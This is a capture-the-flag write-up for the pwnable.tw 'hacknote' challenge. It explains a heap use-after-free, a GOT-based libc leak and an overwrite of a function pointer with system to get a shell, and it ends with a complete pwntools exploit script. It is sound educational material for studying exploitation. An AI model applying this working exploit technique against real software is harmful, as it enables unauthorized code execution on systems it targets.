# pwnable.tw - hacknote

Original challenge link: https://pwnable.tw/challenge/#5

##  Overview

For every created note, the program first mallocs 8 bytes, and stores the address in bss (address referred to as note_ptrs here.) In the 8 bytes (referred to as notes metadata from now on), first 4 bytes are address of a printer_stub, that prints note contents. Next 4 bytes are actual location of string which is malloc'd separately, based on the note length we ask it to use.

When a note is printed, it just dereferences stored pointer in note_ptrs, and calls printer_stub with address of the pointer to notes_metadata. It just skips 4 bytes, and passes the next 4 bytes to puts().

In delete, both notes metadata and string content is freed. However, the vulnerability here is that the pointer to notes_metadata in note_ptrs array is not deleted. This leads to Use-After-Free exploit chain.

## Ideation

The goal should be clear, faking a note's metadata, so we can use our custom func thats called during print, and custom string pointer. 

Generally, if we free a chunk in heap, it can be reused immediatly if malloc demands smaller or equal size buffer.

Lets see what happens if we create 2 notes - 
```
<8 byte note 0 metadata><8 byte malloc metadata>
<note 0 content><8 byte malloc metadata>
<8 byte note 1 metadata><8 byte malloc metadata>
<note 1 content><8 byte malloc metadata>
```

My first idea was to free both notes, and create a new note, with longer content length. I assumed that since everything is freed, glibc would have merged the unsed chunks. But the issue is the 8 byte note 1 metadata, which is smaller and seemed to block merging of larger blocks. The 3rd note's metadata would be stored in note 0's metadata, but the content would be issued after note 1 content. 

So we had to somehow cause an equal size malloc that would get allotted a deleted note's metadata as content.


## Exploit
After a bit of brainstorming, I found that chunk requests larger than current heap segment are issued a separate segment and stored at different address.

So if i create 2 notes of length 1000000, only metadata will be present in heap like this - 

```
heap:
    <8 byte note 0 metadata><8 byte malloc metadata>
    <8 byte note 1 metadata><8 byte malloc metadata>

note_ptrs: <heap> <heap+16>
```

Notice that both are result of malloc(8), and if freed, can be reissued if a new request for malloc(8) comes. This is what we wanted.

Now we free both notes, and create a new note with length 8, it will call malloc(8) for metadata, which will get note 0 metadata addr, and then malloc(8) for content, which will get note 1 metadata addr. 

Now, whatever we can write 8 bytes into the new note, which is exactly the same address as note_1 metadata. So we write first 4 bytes as same print_stub addr, but replace next 4 bytes address of GOT puts. 

```py
### malloc chunks larger than current heap
add(1000000, b"hahaha")
add(1000000, b"lmaoooo")
delete(1)
delete(0)

add(8, p32(print_stub)+p32(exe.got["puts"])) 
```

Now if you notice the note_ptrs, it becomes - 
```
note_ptrs: <heap> <heap+16> <heap>

heap:
    <8 byte note 2 metadata><8 byte malloc metadata>
    <addr of print_stub><addr of got puts><8 byte malloc metadata>
 
```
idx 1 is still pointing to heap+16, which is now the content of our 3rd (idx 2) note. So now if we print note 1, it will call print_stub(heap+16), which in turn will call puts(heap+20) and will leak the libc address.

Now with libc leak, we do the same metadata corruption again, but this time, replace print_stub address with libc system() func.

```py
delete(0)
add(8, p32(libc.sym["system"])+b";sh;") 
```

Now when print is chosen from menu for idx 1, it will call heap+16 func which is system and pass heap+16 as parameter, making final call - `system("<4byte addr>;sh;")`

4 byte address will just cause command not found, it doesnt cause any crash, and system execustes sh, giving us the shell.





## Solve Script
```py
from pwn import *
import time

exe = ELF("./hacknote_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['wt.exe', 'wsl.exe', '-d', 'kali-linux']

def conn():
    if args.REMOTE:
        r = remote("chall.pwnable.tw", 10102)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
            time.sleep(2)
    return r

p = conn()
print_stub = 0x804862b # default print function used for every note

def add(size, content):
    p.sendlineafter(b"choice :", b"1")
    p.sendlineafter(b"size :", str(size).encode())
    p.sendafter(b"Content :", content)

def delete(idx):
    p.sendlineafter(b"choice :", b"2")
    p.sendlineafter(b"Index :", str(idx).encode())

### malloc chunks larger than current heap
add(1000000, b"hahaha")
add(1000000, b"lmaoooo")
delete(1)
delete(0)

add(8, p32(print_stub)+p32(exe.got["puts"])) 

#leak libc puts
p.sendlineafter(b"choice :", b"3")
p.sendlineafter(b"Index :", b"1")
libc.address = u32(p.recv(4)) - libc.sym["puts"]
log.info(f"leaked puts addr - {hex(libc.sym["puts"])}")

### overwrite print_stub with system(), and add payload in next 4 bytes
delete(0)
add(8, p32(libc.sym["system"])+b";sh;") 
p.sendlineafter(b"choice :", b"3")
p.sendlineafter(b"Index :", b"1")
p.interactive()

```